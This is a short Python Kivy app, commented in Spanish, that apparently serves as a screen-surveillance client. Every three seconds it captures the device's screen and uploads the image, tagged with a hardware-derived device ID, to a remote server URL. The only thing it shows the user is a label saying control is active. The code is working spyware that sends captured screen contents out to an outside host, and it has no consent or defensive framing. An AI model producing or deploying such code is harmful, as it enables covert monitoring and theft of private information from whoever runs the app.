from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from plyer import screenshot
import requests
import uuid
import os

# CONFIGURACIÓN
SERVER_URL = "https://dios-ybjy.onrender.com/upload-screenshot"
DEVICE_ID = str(uuid.getnode())  # ID único del dispositivo

class ControlApp(App):
    def build(self):
        Clock.schedule_interval(self.capture_and_upload, 3)  # cada 3 segundos
        return Label(text="Control activo/// Conexión exitosa")

    def capture_and_upload(self, dt):
        filename = f"screenshot.png"
        try:
            screenshot.take(filename)
            with open(filename, 'rb') as f:
                files = {'file': (filename, f, 'image/png')}
                data = {'device_id': DEVICE_ID}
                response = requests.post(SERVER_URL, data=data, files=files)
                print("Subida:", response.status_code)
        except Exception as e:
            print("Error al capturar/subir:", e)

if __name__ == '__main__':
    ControlApp().run()
